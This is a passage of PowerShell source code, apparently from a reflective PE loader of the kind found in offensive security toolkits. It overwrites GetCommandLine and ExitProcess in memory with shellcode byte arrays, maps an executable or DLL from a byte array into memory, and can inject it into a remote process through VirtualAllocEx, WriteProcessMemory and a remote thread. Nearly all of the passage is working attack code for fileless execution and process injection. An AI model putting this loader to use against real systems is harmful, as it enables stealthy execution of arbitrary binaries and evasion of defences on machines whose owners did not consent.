		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
